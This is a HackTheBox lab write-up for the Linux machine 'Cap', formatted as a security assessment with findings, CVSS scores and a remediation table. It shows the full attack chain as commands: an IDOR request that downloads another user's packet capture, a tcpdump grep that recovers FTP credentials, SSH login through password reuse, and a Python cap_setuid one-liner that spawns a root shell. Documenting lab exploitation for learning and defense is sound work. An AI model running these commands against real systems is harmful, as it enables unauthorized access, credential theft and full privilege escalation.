# Cap — HackTheBox

| | |
|---|---|
| **OS** | Linux |
| **Difficulty** | Easy |
| **IP** | 10.10.10.245 |
| **Author** | Youssef Mohamed Abdelwahed (eWPTX, eCPPT) |

---

## Summary

Full compromise of **Cap** chained an **IDOR** in the web dashboard, **cleartext FTP credentials** recovered from a leaked packet capture, and a **`cap_setuid` Linux capability** on the Python binary.

**Attack path:** unauthenticated web access → IDOR on `/data/<id>` → download pcap → recover FTP credentials → SSH as `nathan` (user) → `cap_setuid` on Python → **root**.

| Severity | Finding |
|---|---|
| 🔴 High | IDOR exposes other users' packet captures |
| 🔴 High | Cleartext credentials transmitted over FTP |
| 🔴 High | Privilege escalation via `cap_setuid` on `/usr/bin/python3.8` |
| 🟠 Low | Password reuse across FTP and SSH |

---

## 1. Reconnaissance

```bash
nmap -sC -sV -oA cap 10.10.10.245
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    gunicorn
|_http-title: Security Dashboard
```

Three services: FTP (21), SSH (22) and an HTTP "Security Dashboard" (80) served by gunicorn.

---

## 2. Web Application — IDOR

The dashboard's **Security Snapshot** feature captures network traffic and serves the result at `/data/<id>`. The numeric ID is user-controllable and carries **no authorization check**.

```
Own capture      : http://10.10.10.245/data/2
Tampered request : http://10.10.10.245/data/0   ← another user's capture
```

Capture **ID 0** can be downloaded as a `.pcap` by any unauthenticated visitor.

> **F-01 — IDOR exposing network captures** · High · CWE-639
> CVSS 3.1: 8.6 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

## 3. Credential Recovery

FTP transmits credentials in cleartext, so the captured session leaks them directly:

```bash
tcpdump -r 0.pcap -A | grep -iE 'USER|PASS'
# USER nathan
# PASS <recovered-from-capture>
```

> **F-02 — Cleartext credentials over FTP** · High · CWE-319
> CVSS 3.1: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)

---

## 4. Initial Access

The recovered credentials are reused on SSH (password reuse, F-04):

```bash
ssh nathan@10.10.10.245
id
# uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
cat user.txt
```

---

## 5. Privilege Escalation — `cap_setuid`

Enumerate file capabilities:

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` lets an unprivileged user set UID 0 and spawn a root shell — no SUID bit or sudo needed:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
# uid=0(root) gid=1001(nathan) groups=1001(nathan)
cat /root/root.txt
```

> **F-03 — Privilege escalation via cap_setuid on Python** · High · CWE-250
> CVSS 3.1: 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)

---

## 6. Remediation

| Finding | Recommendation |
|---|---|
| F-01 IDOR | Enforce server-side authorization on `/data/<id>`; bind captures to their owner's session and use unguessable UUIDs instead of sequential IDs. |
| F-02 Cleartext FTP | Disable plain FTP; use FTPS or SFTP. |
| F-03 cap_setuid | Remove the capability: `setcap -r /usr/bin/python3.8`. Never grant `cap_setuid` to a general-purpose interpreter. |
| F-04 Password reuse | Unique credentials per service; prefer key-based SSH auth; rotate exposed credentials. |

---

*Assessed in an authorized HackTheBox lab environment. Flag values and recovered secrets are intentionally omitted.*
